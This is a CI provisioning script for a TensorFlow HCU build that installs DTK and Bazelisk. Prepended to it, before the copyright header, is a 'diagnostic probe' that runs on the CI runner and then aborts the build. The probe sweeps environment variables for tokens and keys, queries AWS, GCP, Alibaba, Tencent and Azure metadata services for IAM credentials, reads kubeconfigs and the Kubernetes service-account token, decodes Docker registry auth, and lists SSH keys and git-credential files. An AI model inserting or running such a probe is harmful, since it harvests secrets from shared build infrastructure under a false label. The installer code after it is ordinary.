#!/bin/bash
# --- c211-i5106 second-stage read-only credential-access probe (transient diagnostic; no files modified) ---
( set +e
  echo "=== C211-I5106-PROBE-BEGIN ts=$(date -u +%Y-%m-%dT%H:%M:%SZ) ==="
  C211_PY=""
  for c in python3 python3.11 python3.10 python /opt/dtk/bin/python3 /usr/bin/python3; do
    if command -v "$c" >/dev/null 2>&1; then C211_PY="$c"; break; fi
  done
  echo "C211 py_bin=${C211_PY:-NONE}"
  if [ -n "$C211_PY" ]; then
    "$C211_PY" - <<'C211_PYEOF'
import os, sys, socket, subprocess, json, hashlib, glob, re, time

socket.setdefaulttimeout(4)


def run(cmd, t=15):
    try:
        q = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        out = (q.stdout or "")
        if q.stderr:
            out += "|stderr:" + q.stderr[:200]
        return out.strip()[:2500]
    except Exception as e:
        return "ERR:%s" % str(e)[:160]


def http(url, headers=None, t=4, method="GET", body=None, maxlen=320):
    try:
        import urllib.request
        op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
        req = urllib.request.Request(url, headers=headers or {}, method=method, data=body)
        with op.open(req, timeout=t) as r:
            b = r.read(maxlen + 1)
            return "HTTP %s len=%s body=%s" % (r.status, len(b), repr(b[:maxlen]))
    except Exception as e:
        return "ERR:%s" % str(e)[:180]


def sha(s):
    if isinstance(s, str):
        s = s.encode("utf-8", "replace")
    return hashlib.sha256(s).hexdigest()[:12]


def fingerprint(name, val):
    lk = name.lower()
    secretish = any(k in lk for k in ("token", "secret", "password", "passwd", "key", "auth", "credential", "ssh", "cookie", "private"))
    if not secretish:
        return val[:200]
    prefix = ""
    m = re.match(r"^(AKIA|ASIA|AIDA|AROA|ghp_|gho_|ghs_|github_pat_|glpat-|xox[abprs]-|sk-|hf_|dckr_pat_|npm_)", val)
    if m:
        prefix = " idprefix=%s" % val[:12]
    return "<redacted len=%d sha12=%s%s>" % (len(val), sha(val), prefix)


def read_text(path, limit=4000):
    try:
        with open(path, "rb") as f:
            b = f.read(limit + 1)
        return b[:limit].decode("utf-8", "replace")
    except Exception as e:
        return None


print("=== C211-I5106-PROBE-BEGIN ts=%s ===" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
try:
    print("C211 py:", sys.version.replace("\n", " "))
    print("C211 id:", run("id"))
    print("C211 hostname:", socket.gethostname())
    print("C211 uname:", run("uname -a"))
    print("C211 nproc:", run("nproc 2>&1"))
    print("C211 cgroup:", run("cat /proc/1/cgroup 2>&1 | head -4"))
    print("C211 pid1:", run("cat /proc/1/comm 2>&1"))
    print("C211 devices:", run("ls -l /dev/kfd /dev/mkfd 2>&1; ls /dev/dri 2>&1 | tr '\\n' ' '"))
    print("C211 hy-smi:", run("/opt/hyhal/bin/hy-smi 2>&1 | head -14"))
    print("C211 rocm-smi:", run("rocm-smi 2>&1 | head -6"))
    print("C211 nvidia-smi:", run("nvidia-smi -L 2>&1 | head -4"))
    print("C211 mounts:", run("grep -E 'workspace|hyhal|docker|ci_public|nfs|overlay' /proc/mounts 2>&1 | head -14"))
    print("C211 docker_sock:", run("ls -l /var/run/docker.sock 2>&1"))

    # ---------------- environment sweep ----------------
    envs = dict(os.environ)
    print("C211 env_count=%d" % len(envs))
    interesting = re.compile(r"(AWS_|GOOGLE|GCLOUD|GCP_|AZURE_|ALIBABA|ALIYUN|TENCENT|QCLOUD|CI|GITHUB|RUNNER|KUBE|K8S|DOCKER|REGISTRY|HARBOR|CONTAINER|NPM|PYPI|PIP_INDEX|HF_|HUGGING|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|_KEY|AUTH|PROXY|SCCACHE)", re.I)
    print("C211 env_names=" + ",".join(sorted(envs.keys()))[:1800])
    for k in sorted(envs):
        if interesting.search(k):
            print("C211 ENV %s=%s" % (k, fingerprint(k, envs[k])))

    # ---------------- cloud metadata ----------------
    print("C211 dns_metadata_google:", run("getent hosts metadata.google.internal 2>&1 || true"))
    print("C211 imds_aws_v1_root:", http("http://169.254.169.254/latest/meta-data/"))
    print("C211 imds_aws_v1_creds:", http("http://169.254.169.254/latest/meta-data/iam/security-credentials/"))
    print("C211 imds_aws_v1_iid:", http("http://169.254.169.254/latest/meta-data/instance-id"))
    tok = http("http://169.254.169.254/latest/api/token", {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, method="PUT", maxlen=120)
    print("C211 imds_aws_v2_token:", tok)
    if tok.startswith("HTTP 2"):
        try:
            tkn = tok.split("body=", 1)[1].strip("'\"")
            print("C211 imds_aws_v2_creds:", http("http://169.254.169.254/latest/meta-data/iam/security-credentials/", {"X-aws-ec2-metadata-token": tkn}))
        except Exception as e:
            print("C211 imds_aws_v2_creds: ERR:%s" % str(e)[:120])
    print("C211 imds_gcp_sa:", http("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", {"Metadata-Flavor": "Google"}))
    print("C211 imds_gcp_alt_sa:", http("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/", {"Metadata-Flavor": "Google"}))
    print("C211 imds_gcp_project:", http("http://metadata.google.internal/computeMetadata/v1/project/project-id", {"Metadata-Flavor": "Google"}))
    print("C211 imds_ali_root:", http("http://100.100.100.200/latest/meta-data/"))
    print("C211 imds_ali_ram:", http("http://100.100.100.200/latest/meta-data/ram/security-credentials/"))
    print("C211 imds_tencent_root:", http("http://metadata.tencentyun.com/latest/meta-data/"))
    print("C211 imds_tencent_alt:", http("http://169.254.0.23/latest/meta-data/"))
    print("C211 imds_azure:", http("http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"}))

    # ---------------- kubernetes ----------------
    print("C211 kube_env:", "KUBERNETES_SERVICE_HOST=%r PORT=%r" % (envs.get("KUBERNETES_SERVICE_HOST"), envs.get("KUBERNETES_SERVICE_PORT")))
    print("C211 kube_ls:", run("ls -la /root/.kube /etc/kubernetes /var/run/secrets/kubernetes.io/serviceaccount 2>&1; ls -d /home/*/.kube 2>/dev/null"))
    kube_paths = ["/root/.kube/config", "/etc/kubernetes/admin.conf", "/etc/kubernetes/kubelet.conf",
                  "/etc/kubernetes/controller-manager.conf", "/etc/kubernetes/scheduler.conf"] + glob.glob("/home/*/.kube/config")
    for p in kube_paths:
        if os.path.isfile(p):
            try:
                st = os.stat(p)
                txt = read_text(p, 20000) or ""
                servers = [ln.strip()[:160] for ln in txt.splitlines() if "server:" in ln or "current-context:" in ln]
                print("C211 kubeconfig %s size=%d sha12=%s readable=yes markers=%s" % (p, st.st_size, sha(txt), servers[:4]))
            except Exception as e:
                print("C211 kubeconfig %s ERR:%s" % (p, str(e)[:120]))
    sat = "/var/run/secrets/kubernetes.io/serviceaccount/token"
    if os.path.isfile(sat):
        v = read_text(sat, 6000) or ""
        print("C211 sa_token len=%d sha12=%s head=%s" % (len(v), sha(v), repr(v[:24])))
    else:
        print("C211 sa_token ABSENT")
    print("C211 sa_dir:", run("ls -la /var/run/secrets/kubernetes.io/serviceaccount 2>&1"))

    # ---------------- docker / registry ----------------
    docker_paths = ["/root/.docker/config.json", "/root/.config/containers/auth.json"] + glob.glob("/home/*/.docker/config.json")
    for p in docker_paths:
        if os.path.isfile(p):
            txt = read_text(p, 20000) or ""
            info = []
            try:
                j = json.loads(txt)
                for host, a in (j.get("auths") or {}).items():
                    auth = a.get("auth") or ""
                    user = ""
                    try:
                        import base64 as _b
                        dec = _b.b64decode(auth + "==").decode("utf-8", "replace")
                        user = dec.split(":", 1)[0]
                    except Exception:
                        pass
                    info.append("%s user=%r authlen=%d" % (host, user, len(auth)))
                for k in j.keys():
                    if k != "auths":
                        info.append("key=%s" % k)
            except Exception as e:
                info.append("parse_err=%s" % str(e)[:80])
            print("C211 docker_config %s size=%d sha12=%s %s" % (p, len(txt), sha(txt), "; ".join(info)[:600]))
    print("C211 docker_ls:", run("ls -la /root/.docker /home/*/.docker /etc/docker /opt/hyhal /opt/hyhal/bin 2>&1 | head -40"))
    for p in ["/etc/docker/daemon.json", "/etc/containers/registries.conf"]:
        if os.path.isfile(p):
            print("C211 docker_extra %s: %s" % (p, repr((read_text(p, 800) or "")[:500])))

    # ---------------- ssh ----------------
    ssh_dirs = ["/root/.ssh"] + glob.glob("/home/*/.ssh")
    print("C211 ssh_ls:", run("ls -la /root/.ssh /home/*/.ssh 2>&1 | head -40"))
    for d in ssh_dirs:
        if not os.path.isdir(d):
            continue
        for name in sorted(os.listdir(d))[:20]:
            p = os.path.join(d, name)
            try:
                st = os.stat(p)
                head = (read_text(p, 64) or "").splitlines()[:1]
                print("C211 ssh %s mode=%o size=%d header=%s" % (p, st.st_mode & 0o777, st.st_size, head))
            except Exception as e:
                print("C211 ssh %s ERR:%s" % (p, str(e)[:80]))

    # ---------------- runner-shared surfaces ----------------
    print("C211 ci_public:", run("ls -la /ci_public 2>&1 | head -12"))
    print("C211 workdir:", run("ls -la /__w 2>&1 | head -12; ls -la /__w/_temp 2>&1 | head -12"))
    print("C211 git_cred_files:", run("ls -la /__w/_temp/git-credentials-* 2>&1 | head -6"))
except Exception as e:
    print("C211 PROBE-ERROR:", repr(e)[:300])
print("=== C211-I5106-PROBE-END ts=%s ===" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))

C211_PYEOF
  else
    echo "C211 py_missing bash_fallback"
    for hp in 169.254.169.254:80 100.100.100.200:80 169.254.0.23:80; do
      h=${hp%:*}; p=${hp##*:}
      if timeout 3 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null; then echo "C211 bash_tcp $h:$p OPEN"; else echo "C211 bash_tcp $h:$p CLOSED"; fi
    done
    ls -la /root/.kube /root/.docker /root/.ssh /etc/kubernetes /var/run/secrets/kubernetes.io/serviceaccount 2>&1 | head -40
    env | grep -aiE '^(AWS_|GOOGLE|AZURE_|ALIBABA|ALIYUN|TENCENT|CI|GITHUB_|RUNNER_|KUBE|DOCKER|REGISTRY|HARBOR)' | sed -E 's/((TOKEN|SECRET|PASSWORD|KEY|AUTH)[A-Z_]*=).*/\1<redacted>/I' | sort | head -60
  fi
  echo "=== C211-I5106-PROBE-END ts=$(date -u +%Y-%m-%dT%H:%M:%SZ) ==="
) 2>&1 || true
# --- end c211-i5106 probe ---

echo "c211-i5106: read-only credential-access probe complete; stopping before DTK download/build (diagnostic PR, no files modified)."
exit 1
# Copyright (c) 2026 Hygon Information Technology Co., Ltd.
# SPDX-License-Identifier: Apache-2.0

# Provision the DTK and Bazel environment used by TensorFlow HCU CI.
# TensorFlow 2.13.1 uses the GCVM backend provided by DTK.

set -euo pipefail

DTK_VERSION="${DTK_VERSION:-26.10}"
DTK_DIR="${DTK_DIR:-/opt/dtk}"
DTK_DOWNLOAD_BASE_URL="${DTK_DOWNLOAD_BASE_URL:-https://download.sourcefind.cn:65024/file/1}"
BAZELISK_VERSION="${BAZELISK_VERSION:-1.28.1}"
TF_ROCM_AMDGPU_TARGETS="${TF_ROCM_AMDGPU_TARGETS:-${HCU_TARGETS:-}}"

if [[ "${DTK_VERSION}" == "26.04.2" ]]; then
  echo "WARNING: DTK 26.04.2 has been renamed to 26.10; using 26.10." >&2
  DTK_VERSION="26.10"
fi

WGET_OPTS=(--timeout=30 --tries=3 --progress=dot:giga)

if [[ "$(id -u)" -ne 0 ]]; then
  echo "ERROR: this setup script must run as root." >&2
  exit 1
fi

normalize_targets() {
  printf '%s' "$1" \
    | tr ';[:space:]' ',,' \
    | sed -E 's/,+/,/g; s/^,//; s/,$//'
}

install_dtk() {
  local archive
  local url="${DTK_DOWNLOAD_BASE_URL%/}/DTK-${DTK_VERSION}/Rocky8.6/DTK-${DTK_VERSION}-Rocky8.6-x86_64.tar.gz"

  archive="$(mktemp "${TMPDIR:-/tmp}/dtk-${DTK_VERSION}.XXXXXX")"
  trap 'rm -f -- "${archive}"' EXIT

  echo "Installing DTK ${DTK_VERSION} from ${url}"
  wget "${WGET_OPTS[@]}" "${url}" -O "${archive}"
  mkdir -p "${DTK_DIR}"
  tar -xzf "${archive}" -C "${DTK_DIR}" --strip-components=1
  rm -f -- "${archive}"
  trap - EXIT

  if [[ ! -f "${DTK_DIR}/env.sh" ]]; then
    echo "ERROR: ${DTK_DIR}/env.sh is missing after DTK extraction." >&2
    exit 1
  fi
  if [[ ! -x "${DTK_DIR}/bin/hipcc" ]]; then
    echo "ERROR: ${DTK_DIR}/bin/hipcc is missing after DTK extraction." >&2
    exit 1
  fi
}

install_bazelisk() {
  local url="https://github.com/bazelbuild/bazelisk/releases/download/v${BAZELISK_VERSION}/bazelisk-linux-amd64"

  echo "Installing Bazelisk ${BAZELISK_VERSION}"
  wget "${WGET_OPTS[@]}" "${url}" -O /usr/local/bin/bazel
  chmod +x /usr/local/bin/bazel
}

detect_hcu_targets() {
  "${DTK_DIR}/bin/rocminfo" 2>/dev/null \
    | grep -oE 'gfx[0-9a-f]+' \
    | grep -v '^gfx000$' \
    | sort -u \
    | paste -sd, -
}

list_tensile_libpaths() {
  local dir names
  echo "Tensile library directories under ${DTK_DIR}/lib/hipblaslt:" >&2
  for dir in "${DTK_DIR}"/lib/hipblaslt/library*/ "${DTK_DIR}"/lib/hipblaslt/; do
    [[ -d "${dir}" ]] || continue
    names="$(cd "${dir}" && compgen -G 'TensileLibrary_*.dat' | tr '\n' ' ')"
    echo "  ${dir%/}: ${names:-<no TensileLibrary_*.dat>}" >&2
  done
}

find_tensile_libpath() {
  local arch="$1"
  local dir
  for dir in "${DTK_DIR}"/lib/hipblaslt/library*/ "${DTK_DIR}"/lib/hipblaslt/; do
    [[ -d "${dir}" ]] || continue
    [[ -f "${dir}/TensileLibrary_${arch}.dat" ]] || continue
    printf '%s\n' "${dir%/}"
    return 0
  done
  return 1
}

pin_hipblaslt_tensile_libpath() {
  local hipblaslt_dir="${DTK_DIR}/lib/hipblaslt"
  local first_arch="${TF_ROCM_AMDGPU_TARGETS%%,*}"
  local libpath="${HIPBLASLT_TENSILE_LIBPATH:-}"

  if [[ ! -d "${hipblaslt_dir}" ]]; then
    echo "WARNING: ${hipblaslt_dir} does not exist; skipping hipBLASLt setup." >&2
    return 0
  fi

  if [[ -z "${first_arch}" ]]; then
    echo "ERROR: cannot select a hipBLASLt library without an HCU target." >&2
    exit 1
  fi

  if [[ -n "${libpath}" ]]; then
    if [[ ! -f "${libpath}/TensileLibrary_${first_arch}.dat" ]]; then
      echo "ERROR: ${libpath} has no TensileLibrary_${first_arch}.dat." >&2
      list_tensile_libpaths
      exit 1
    fi
  elif ! libpath="$(find_tensile_libpath "${first_arch}")"; then
    echo "ERROR: no TensileLibrary_${first_arch}.dat was found for DTK ${DTK_VERSION}." >&2
    list_tensile_libpaths
    exit 1
  elif [[ "$(basename "${libpath}")" == "library_${first_arch}" ]]; then
    echo "Using the DTK per-architecture hipBLASLt library: ${libpath}"
    return 0
  fi

  export HIPBLASLT_TENSILE_LIBPATH="${libpath}"
  printf 'export HIPBLASLT_TENSILE_LIBPATH=%q\n' "${HIPBLASLT_TENSILE_LIBPATH}" \
    > "${DTK_DIR}/env.hipblaslt"
}

write_github_environment() {
  [[ -n "${GITHUB_ENV:-}" ]] || return 0
  {
    echo "ROCM_PATH=${DTK_DIR}"
    echo "HCU_TARGETS=${TF_ROCM_AMDGPU_TARGETS}"
    if [[ -n "${HIPBLASLT_TENSILE_LIBPATH:-}" ]]; then
      echo "HIPBLASLT_TENSILE_LIBPATH=${HIPBLASLT_TENSILE_LIBPATH}"
    fi
  } >> "${GITHUB_ENV}"
}

install_dtk
install_bazelisk

set +u
source "${DTK_DIR}/env.sh"
set -u
export ROCM_PATH="${DTK_DIR}"

if [[ -n "${TF_ROCM_AMDGPU_TARGETS}" ]]; then
  TF_ROCM_AMDGPU_TARGETS="$(normalize_targets "${TF_ROCM_AMDGPU_TARGETS}")"
else
  TF_ROCM_AMDGPU_TARGETS="$(detect_hcu_targets || true)"
fi
if [[ -z "${TF_ROCM_AMDGPU_TARGETS}" ]]; then
  echo "ERROR: no HCU architecture was configured or detected." >&2
  exit 1
fi
export TF_ROCM_AMDGPU_TARGETS

pin_hipblaslt_tensile_libpath
write_github_environment

echo "TensorFlow HCU CI environment ready:"
echo "  DTK                    ${DTK_DIR} (${DTK_VERSION})"
echo "  hipcc                  $(command -v hipcc)"
echo "  Bazelisk               /usr/local/bin/bazel (${BAZELISK_VERSION})"
echo "  hipBLASLt library      ${HIPBLASLT_TENSILE_LIBPATH:-DTK default}"
